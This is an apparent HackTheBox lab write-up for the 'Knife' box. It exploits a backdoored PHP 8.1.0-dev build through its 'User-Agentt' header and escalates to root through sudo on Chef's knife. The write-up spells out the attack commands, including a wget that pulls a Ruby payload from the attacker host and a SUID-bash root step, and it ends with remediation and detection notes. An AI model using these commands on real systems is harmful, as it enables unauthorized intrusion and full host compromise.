# HackTheBox — Knife

> **OS:** Linux (Ubuntu)  ·  **Difficulty:** Easy  ·  **Date:** 2026-08-14

**Kill chain:** `header discloses PHP 8.1.0-dev → backdoor RCE (User-Agentt) → shell as james → sudo knife exec → root`

---

## Overview

Knife is a two-step easy box: a **backdoored PHP build** (`8.1.0-dev`) gives unauthenticated RCE via a magic `User-Agentt` header, and a **sudo misconfiguration** (`NOPASSWD` on the Chef `knife` binary) escalates straight to root, since `knife exec` runs arbitrary Ruby.

The technical path is short. The real lesson of this box — and the bulk of the time spent — was **operating through a hostile foothold shell**. The public PoC's shell is non-interactive, has no TTY, and mangles shell metacharacters (quotes, redirects, pipes). Nearly every failed attempt traced back to that, not to the exploit or the privesc. The tradecraft takeaway is documented below because it generalises far beyond this box.

---

## Recon

### Port scan

```bash
nmap -sV -sC -p- 10.129.56.81
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
|_http-title: Emergent Medical Idea
```

SSH and HTTP. The web app is the only real surface.

### The header disclosure

The site itself is unremarkable, so fingerprint the *application layer*, not just Apache. Wappalyzer flattens it to "PHP 8.1.0", but the raw response header tells the truth — always verify off the header rather than trusting the plugin:

```bash
curl -I http://10.129.56.81
```

```
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev      ← the "-dev" suffix is the whole finding
```

`PHP/8.1.0-dev` is not a stock release. That exact build was **backdoored** in the March 2021 compromise of PHP's git infrastructure: a commit added code that executes commands passed in a `User-Agentt` header. That specific, verified version string is the entire pivot.

---

## Exploitation — PHP 8.1.0-dev backdoor RCE

```bash
searchsploit php 8.1.0-dev
searchsploit -m 49933          # PHP 8.1.0-dev 'User-Agentt' RCE
python3 49933.py
# → http://10.129.56.81
```

```
Interactive shell is opened on http://10.129.56.81
$ whoami
james
```

Foothold as **james**. The mechanism: the backdoor treats anything after a `zerodiumsystem(...)` marker in the `User-Agentt` header as a command to execute.

### ⚠️ The hostile shell — the actual lesson of this box

The PoC's "shell" is **not a shell**. Each command is a fresh, non-interactive `system()` call over HTTP with **no TTY** (`can't access tty; job control turned off`). Consequences observed, and the rule each one teaches:

- `cd` does not persist — every command starts from `/`. → **Use absolute paths.**
- Commands containing quotes, `>`, `>&`, `|`, or `bash -c` frequently failed with a misleading `No input file specified`. The PoC wraps input in a `system("...")` call, and metacharacters collide with that wrapper. → **Do not type complex syntax into this shell.**
- Interactive tricks (`knife exec` with no arg needs Ctrl+D; but Ctrl+D also closes the PoC session) are dead ends. → **Avoid anything interactive.**
- The box also **reset mid-session** (target IP changed), wiping any files staged on the previous instance. → **Verify state on the current instance before acting.**

**The workaround that solved everything: route all complexity into a file built on the attacker box, transfer it with a bare command, and only ever type metacharacter-free commands on the victim.** `wget -O` is ideal — it writes the file itself, so the victim shell never handles a `>` redirect, and any quotes live safely inside the file's contents.

The clean, intended alternative (what most walkthroughs do): **stabilise the shell first** — catch a reverse shell or spawn a PTY — *then* run the privesc in a normal shell where quoting behaves. Either approach works; the mistake is trying to do everything inside the raw PoC shell.

```bash
# user flag (absolute path — cd doesn't persist)
cat /home/james/user.txt
```

---

## Privilege Escalation — sudo knife exec

```bash
sudo -l
```

```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

`knife` is Chef's CLI (a Ruby program). Its `exec` subcommand runs arbitrary Ruby, and running it under `sudo` runs that Ruby **as root** — the GTFOBins pattern for knife.

### The intended one-liner (in a stabilised shell)

```bash
sudo knife exec -E 'exec "/bin/bash"'
```

In a proper shell this drops a root shell immediately. In the raw PoC shell it fails, because the `"` characters collide with the backdoor's `system("...")` wrapper — which is exactly why stabilising first matters.

### The file-routed method (works even in the hostile shell)

Put the payload in a file on the attacker box (quotes are safe here), serve it, pull it with a bare `wget -O`, and run knife against the file — no metacharacters ever typed on the victim:

```bash
# attacker
echo 'system("chmod +s /bin/bash")' > shell.rb
python3 -m http.server 8000

# victim — all bare commands, no quotes/redirects/pipes
wget http://<attacker-ip>:8000/shell.rb -O /tmp/shell.rb
cat /tmp/shell.rb          # verify it landed with correct content
sudo knife exec /tmp/shell.rb
ls -l /bin/bash            # confirm -rwsr-sr-x
/bin/bash -pc id
```

```
-rwsr-sr-x 1 root root 1183448 /bin/bash
uid=1000(james) ... euid=0(root) egid=0(root) groups=0(root),1000(james)
```

`euid=0(root)` — root achieved. The `-p` flag preserves the setuid privilege so the SUID bash keeps root's effective UID.

```bash
cat /root/root.txt         # via the SUID bash / knife-as-root
```

---

## Remediation

| Finding | Severity | Fix |
|---------|----------|-----|
| Backdoored PHP 8.1.0-dev (User-Agentt RCE) | **Critical** | Never run `-dev`/untrusted PHP builds in production. Install PHP only from official, integrity-verified packages; rebuild this host from a known-good source. |
| Unauthenticated RCE exposed on port 80 | Critical | The above is unauthenticated and remote — treat as full compromise; rotate all secrets on the host. |
| `NOPASSWD` sudo on `/usr/bin/knife` | High | Remove the sudo rule. `knife exec` runs arbitrary Ruby — granting it via sudo is equivalent to granting full root. Scope sudo to specific, non-code-executing commands only. |
| Version disclosure in `X-Powered-By` | Low | Suppress `X-Powered-By` (`expose_php = Off`) so exact build strings aren't advertised. |

---

## Detection notes (blue-team view)

- **The backdoor is signature-detectable at the network layer.** The exploit sends a `User-Agentt` header (note the doubled *t*) containing a `zerodiumsystem(...)` marker. Alerting on that header name or the `zerodium` string in HTTP requests catches this specific PoC outright — it's a high-fidelity, low-false-positive signature.
- **Any traffic to this build should already be flagged upstream.** `PHP/8.1.0-dev` in a response header is itself an indicator of compromise — no legitimate deployment serves the backdoored dev build. Vuln management / attack-surface scanning should catch it before an attacker does.
- **Host / EDR:** post-exploitation shows a **web-server process (`apache2`/`php`) spawning shell commands** — `sh -c whoami`, `wget`, etc. A webserver child process running `wget` to an external IP, or later spawning `knife`/`ruby` under sudo, is high-signal.
- **The privesc has a clean host signal:** `james` invoking `sudo knife exec` — a Chef workstation command run by an interactive user via sudo — is anomalous in almost any environment and worth an alert. So is a **`chmod +s` on `/bin/bash`**; file-integrity monitoring on system binaries catches the SUID change directly.

---

## Lessons

- **Verify version strings off the raw header, not a plugin.** Wappalyzer hid the `-dev` suffix that was the entire finding; `curl -I` revealed it.
- **A foothold shell is not always a usable shell.** When you see "can't access tty / job control turned off," *stabilise before you do anything else* — reverse shell or PTY. Fighting a metacharacter-mangling shell command-by-command wastes enormous time.
- **When a shell mangles syntax, route complexity through files.** Build payloads on the attacker box where quoting is sane, transfer with a bare `wget -O`, and keep victim-side commands free of quotes, redirects, and pipes.
- **`sudo` on any code-execution tool is `sudo` on everything.** knife, like many "admin" binaries, runs arbitrary code by design — granting it via sudo is a full root grant, not a scoped one.
